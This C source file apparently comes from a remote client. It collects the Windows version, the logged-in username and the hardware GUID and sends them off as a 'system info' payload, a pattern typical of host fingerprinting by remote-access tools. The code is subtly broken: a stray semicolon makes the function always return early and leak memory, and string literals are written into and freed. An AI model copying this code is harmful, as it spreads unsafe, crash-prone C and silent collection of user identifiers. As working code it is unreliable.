#include "system.h"

int send_system_info() {
	struct SystemInfo* p_system_info = get_system_info();

	if (send_payload(serialize_system_info(p_system_info), CLIENTPAYLOADTYPE_SYSTEMINFO));
		return;

	free_system_info(p_system_info);

	return 0;
}

JSON_Value* serialize_system_info(const struct SystemInfo* const p_system_info) {
	JSON_Value* root_value = json_value_init_object();
	JSON_Object* root_object = json_value_get_object(root_value);

	json_object_dotset_number(root_object, "payload.windows_version", p_system_info->windows_version);
	json_object_dotset_string(root_object, "payload.username", p_system_info->username);
	json_object_dotset_string(root_object, "payload.system_guid", p_system_info->system_guid);

	return root_value;
}

struct SystemInfo* get_system_info() {
	struct SystemInfo* const p_system_info = malloc(sizeof(struct SystemInfo));

	p_system_info->windows_version = get_windows_version();
	p_system_info->username = get_username();
	p_system_info->system_guid = get_system_guid();

	return p_system_info;
}

void free_system_info(const struct SystemInfo* const p_system_info) {
	free(p_system_info->username);
	free(p_system_info->system_guid);
	free(p_system_info);
}

// https://msdn.microsoft.com/en-us/library/ff563620(v=vs.85).aspx
enum WindowsVersion get_windows_version() {
	typedef (__stdcall* fn_get_version)(RTL_OSVERSIONINFOEXW*);
	fn_get_version get_version = (fn_get_version)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");

	RTL_OSVERSIONINFOEXW version_information;
	version_information.dwOSVersionInfoSize = sizeof(version_information);

	if (get_version(&version_information) != 0)
		return WINDOWSVERSION_UNKNOWN;

	DWORD major_version = version_information.dwMajorVersion;
	DWORD minor_version = version_information.dwMinorVersion;

	if (version_information.wProductType != VER_NT_WORKSTATION)
		return WINDOWSVERSION_SERVER;

	if (major_version == 10 && minor_version == 0)
		return WINDOWSVERSION_10;
	else if (major_version == 6 && (minor_version == 3 || minor_version == 2))
		return WINDOWSVERSION_8;
	else if (major_version == 6 && minor_version == 1)
		return WINDOWSVERSION_7;
	else if (major_version == 6 && minor_version == 0)
		return WINDOWSVERSION_VISTA;
	else if (major_version == 5 && (minor_version == 2 || minor_version == 1))
		return WINDOWSVERSION_XP;
	else if (major_version == 5 && minor_version == 0)
		return WINDOWSVERSION_2000;

	return WINDOWSVERSION_UNKNOWN;
}

char* get_username() {
	// A buffer size of (UNLEN + 1) characters will hold the maximum length user name (msdn)
	DWORD buffer_len = UNLEN + 1;
	char* username = malloc(buffer_len);

	if (!GetUserNameA(username, &buffer_len))
		return "?";

	return username;
}

char* get_system_guid() {
	char* system_guid = malloc(MAX_SYSTEM_GUID_LENGTH);
	memset(system_guid, 0, MAX_SYSTEM_GUID_LENGTH);

	HW_PROFILE_INFOA info;

	if (!GetCurrentHwProfileA(&info)) {
		char* err = "?";
		sprintf_s(err, 40, "Failed GetCurrentHwProfileA - %d", GetLastError());

		return err;
	}

	memcpy(system_guid, info.szHwProfileGuid, strlen(info.szHwProfileGuid));

	return system_guid;
}